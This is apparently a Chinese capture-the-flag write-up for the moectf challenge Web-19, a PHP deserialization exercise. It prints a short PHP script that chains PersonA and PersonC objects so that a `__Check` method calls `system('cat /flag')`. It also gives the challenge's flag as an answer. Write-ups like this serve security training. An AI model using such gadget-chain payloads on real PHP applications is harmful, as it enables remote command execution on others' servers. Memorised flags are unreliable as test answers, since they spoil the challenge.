# Web-19｜第十九章 星穹真相·补天归源

## 碎碎念

反序列化 3.0
***
## Writeup

更难的反序列化，需要构造调用链，阅读代码，关键在于 `__Check` 函数中的 `$name($age);` ，我们可以尝试构造 `$name` 为 `system` 来执行系统命令，一步一步往上构造调用：

```php
<?php
class PersonA {
    public $name;
    public $id;
    public $age;
}
class PersonC {
    public $name;
    public $id;
    public $age;
}

$pc = new PersonC();
$pc->name = 'system';
$pc->age = "";
$pa = new PersonA();
$pa->name = $pc;
$pa->id = '__Check';
$pa->age = 'cat /flag';
echo urlencode(serialize($pa));
?>
```

传入参数 person 得到 flag：

![](../../../../assets/Pasted%20image%2020251029200506.png)

最终 flag：`moectf{4a7cdb12-80bf-5223-7501-ffe90c04a1cb}`